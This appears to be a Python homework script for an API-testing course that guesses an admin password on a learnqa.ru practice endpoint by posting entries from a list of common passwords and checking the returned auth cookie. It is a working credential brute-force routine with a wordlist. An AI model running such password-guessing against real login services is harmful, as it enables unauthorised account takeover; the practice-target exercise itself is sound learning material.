import requests

key = ["!@#$%^&*", "000000", "111111", "Dragon", "121212", "123123", "Baseball", "1234", "12345", "Letmein", "123456", "1234567", "Monkey", "12345678", "123456789", "1234567890", "123qwe", "1q2w3e4r", "Master", "1qaz2wsx", "555555", "Passw0rd", "654321", "Bailey", "666666", "696969", "7777777", "888888", "Superman", "Aa123456", "Abc123", "Access", "Admin", "Sunshine", "Adobe123", "Ashley", "Azerty", "Batman", "Charlie", "Donald", "Michael", "Flower", "Football", "Freedom", "Hello", "Hottie", "Iloveyou", "Trustno1", "Jesus", "Login", "Lovely", "Shadow", "Loveme", "Mustang", "Ninja", "Password", "Password1", "Football", "Photoshop", "Princess", "Qazwsx", "Qwerty", "Qwerty123", "Qwertyuiop", "Solo", "Starwars", "Welcome", "Whatever", "Zaq1zaq1"]

m = 0
while m < 25:
    valid = {"login":"super_admin", "password":key[m]}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=valid)
    cookie = response1.cookies.get('auth_cookie')

    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", data={'auth_cookie':cookie})
    print(response2.text)

    m += 1
